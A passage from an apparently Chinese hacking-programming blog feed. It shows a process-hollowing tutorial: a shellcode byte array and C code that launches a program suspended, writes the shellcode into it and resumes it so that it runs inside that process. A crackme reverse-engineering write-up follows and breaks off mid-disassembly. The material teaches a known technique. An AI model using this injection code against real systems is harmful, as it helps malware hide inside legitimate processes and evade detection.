class="hljs-number">0x89</span><br>,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x08</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC8</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x44</span><br>,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x78</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0x20</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x8B</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x48</span> ,<span class="hljs-number">0x24</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xDC</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span><br>,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0x1C</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0x18</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE4</span> ,<span class="hljs-number">0xC7</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x00</span><br>,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC7</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xEB</span> ,<span class="hljs-number">0x09</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xC0</span> ,<span class="hljs-number">0x01</span><br>,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x3B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xE4</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0x6D</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF4</span><br>,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x90</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span><br>,<span class="hljs-number">0xC2</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x47</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span><br>,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC1</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x65</span><br>,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x29</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xD1</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span><br>,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x74</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x12</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC8</span><br>,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x50</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB9</span><br>,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC1</span> ,<span class="hljs-number">0xE1</span> ,<span class="hljs-number">0x02</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0x0F</span><br>,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0xE2</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB9</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xD1</span> ,<span class="hljs-number">0x05</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span><br>,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x10</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF9</span> ,<span class="hljs-number">0x6F</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0xCA</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC2</span><br>,<span class="hljs-number">0x06</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x63</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0xB2</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB8</span><br>,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC8</span> ,<span class="hljs-number">0x07</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0x0F</span><br>,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x9A</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB9</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC1</span> ,<span class="hljs-number">0xE1</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span><br>,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x82</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB9</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xD1</span><br>,<span class="hljs-number">0x09</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x10</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF9</span> ,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0x75</span> ,<span class="hljs-number">0x6E</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span><br>,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC2</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0x75</span> ,<span class="hljs-number">0x5A</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span><br>,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC8</span> ,<span class="hljs-number">0x0B</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0x75</span> ,<span class="hljs-number">0x46</span> ,<span class="hljs-number">0xB9</span><br>,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xD1</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x10</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF9</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0x75</span><br>,<span class="hljs-number">0x32</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC2</span> ,<span class="hljs-number">0x0D</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span><br>,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0x75</span> ,<span class="hljs-number">0x1E</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xDC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xB7</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span><br>,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xD8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x81</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xD4</span> ,<span class="hljs-number">0xEB</span> ,<span class="hljs-number">0x05</span> ,<span class="hljs-number">0xE9</span> ,<span class="hljs-number">0x7E</span> ,<span class="hljs-number">0xFE</span><br>,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD4</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0xE5</span> ,<span class="hljs-number">0x5D</span> ,<span class="hljs-number">0xC3</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> &#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (ReplacProcess(<span class="hljs-string">&quot;C:\\Users\\Tophanter\\Desktop\\ConsoleApplication1.exe&quot;</span>) == TRUE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;傀儡进程成功\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;失败\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">ReplacProcess</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszFilePath)</span></span><br><span class="hljs-function"></span>&#123;<br>STARTUPINFO si;<br>PROCESS_INFORMATION pi;<br>CONTEXT threadContext = &#123; <span class="hljs-number">0</span> &#125;;<br>RtlZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si));<br>RtlZeroMemory(&amp;pi, <span class="hljs-keyword">sizeof</span>(pi));<br>RtlZeroMemory(&amp;threadContext, <span class="hljs-keyword">sizeof</span>(threadContext));<br>si.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFO);<br>BOOL Flag = FALSE;<br><span class="hljs-comment">//创建挂起的进程</span><br>Flag = CreateProcess(pszFilePath, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><span class="hljs-keyword">if</span> (Flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建挂起进程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//获取线程的上下文</span><br>threadContext.ContextFlags = CONTEXT_FULL;<br>Flag = GetThreadContext(pi.hThread, &amp;threadContext);<br><span class="hljs-keyword">if</span> (Flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取线程上下文失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 拿到目标进程主线程上下文后，在Ebx寄存器中保存的就是PEB的地址，</span><br><span class="hljs-comment">// 而PEB结构偏移0x8的位置是AddressOfImageBase字段，</span><br><span class="hljs-comment">// 所以直接来读取ctx.Ebx+0x8，就可以获取到目标进程的加载基址</span><br>LPVOID lpBuffer = <span class="hljs-number">0</span>;<br>Flag = ReadProcessMemory(pi.hProcess, (LPVOID)(threadContext.Ebx + <span class="hljs-number">0x8</span>), &amp;lpBuffer, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (Flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;读取内存数据失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//写入shellcode</span><br>Flag = WriteProcessMemory(pi.hProcess, (LPVOID)threadContext.Eax, data, <span class="hljs-keyword">sizeof</span>(data), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (Flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入数据失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//恢复执行</span><br>ResumeThread(pi.hThread);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行程序可以看到成功弹出shellcode 的内容。</p><p><img src="/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/1.png"></p><p>使用任务管理器查看可以看到傀儡进程。</p><p><img src="/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/2.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>《Windows黑客编程技术详解》</p><p><a href="https://blog.csdn.net/cssxn/article/details/97645162">创建傀儡进程代码</a></p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>隐藏技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-007</title>
    <link href="/2021/08/03/160CrackMe-007/"/>
    <url>/2021/08/03/160CrackMe-007/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序还是和上一个有很熟悉的画面，不愧是同一个作者做的。</p><p><img src="/2021/08/03/160CrackMe-007/1.png"></p><p>about按钮了解情况，还是需要让按钮消失然后露出logo就算成功了。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>无壳，是使用delphi编写的。</p><p><img src="/2021/08/03/160CrackMe-007/2.png"></p><p>还是直接使用DeDark查看，然后去下断</p><p><img src="/2021/08/03/160CrackMe-007/3.png"></p><p>断下来之后进行分析，可以看到一个较为关键的跳转，在此之前的函数比较重要，进去查看一下。</p><p><img src="/2021/08/03/160CrackMe-007/4.png"></p><p>进来之后果然看到了算法</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">004429EE  |.  <span class="hljs-number">8945</span> F4       <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xC</span>],<span class="hljs-built_in">eax</span><br>004429F1  |.  BE <span class="hljs-number">01000000</span>   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>,<span class="hljs-number">0x1</span><br>004429F6  |&gt;  8B45 F8       /<span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]<br>004429F9  |.  E8 3610FCFF   |<span class="hljs-keyword">call</span> aLoNg3x_<span class="hljs-number">.</span>00403A34<br>004429FE  |.  83F8 <span class="hljs-number">01</span>       |<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x1</span><br>00442A01  |.  7C <span class="hljs-number">1D</span>         |<span class="hljs-keyword">jl</span> short aLoNg3x_<span class="hljs-number">.</span>00442A20<br>00442A03  |&gt;  8B55 F8       |/<span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]<br>00442A06  |.  0FB65432 FF   ||<span class="hljs-keyword">movzx</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">edx</span>+<span class="hljs-built_in">esi</span>-<span class="hljs-number">0x1</span>]<br>00442A0B  |.  8B4D F8       ||<span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8</span>]<br>00442A0E  |.  0FB64C01 FF   ||<span class="hljs-keyword">movzx</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[<span class="hljs-built_in">ecx</span>+<span class="hljs-built_in">eax</span>-<span class="hljs-number">0x1</span>]<br>00442A13  |.  0FAFD1        ||<span class="hljs-keyword">imul</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">ecx</span><br>00442A16  |.  0FAFD7        ||<span class="hljs-keyword">imul</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edi</span><br>00442A19  |.  03DA          ||<span class="hljs-keyword">add</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">edx</span><br>00442A1B  |.  <span class="hljs-number">48</span>            ||<span class="hljs-keyword">dec</span> <span class="hljs-built_in">eax</span><br>00442A1C  |.  85C0          ||<span class="hljs-keyword">test</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>00442A1E  |.^ <span class="hljs-number">75</span> E3         |\<span class="hljs-keyword">jnz</span> short aLoNg3x_<span class="hljs-number">.</span>00442A03<br>00442A20  |&gt;  <span class="hljs-number">46</span>            |<span class="hljs-keyword">inc</span> <span class="hljs-built_in">esi</span><br>00442A21  |.  FF4D F4       |<span class="hljs-keyword">dec</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xC</span>]<br>00442A24  |.^ <span class="hljs-number">75</span> D0         \<span class="hljs-keyword">jnz</span> short aLoNg3x_<span class="hljs-number">.</span>004429F6<br>00442A26  |&gt;  8BC3          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">ebx</span><br>00442A28  |.  <span class="hljs-number">99</span>            <span class="hljs-keyword">cdq</span><br>00442A29  |.  33C2          <span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span><br>00442A2B  |.  2BC2          <span class="hljs-keyword">sub</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">edx</span><br>00442A2D  |.  B9 2A2C0A00   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-number">0xA2C2A</span><br>00442<span class="hljs-built_in">A32</span>  |.  <span class="hljs-number">99</span>            <span class="hljs-keyword">cdq</span><br>00442A33  |.  F7F9          <span class="hljs-keyword">idiv</span> <span class="hljs-built_in">ecx</span><br>00442A35  |.  8BDA          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">edx</span><br>00442A37  |.  8B45 FC       <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]<br>00442A3A  |.  B9 <span class="hljs-number">59000000</span>   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-number">0x59</span><br>00442A3F  |.  <span class="hljs-number">99</span>            <span class="hljs-keyword">cdq</span><br>00442A40  |.  F7F9          <span class="hljs-keyword">idiv</span> <span 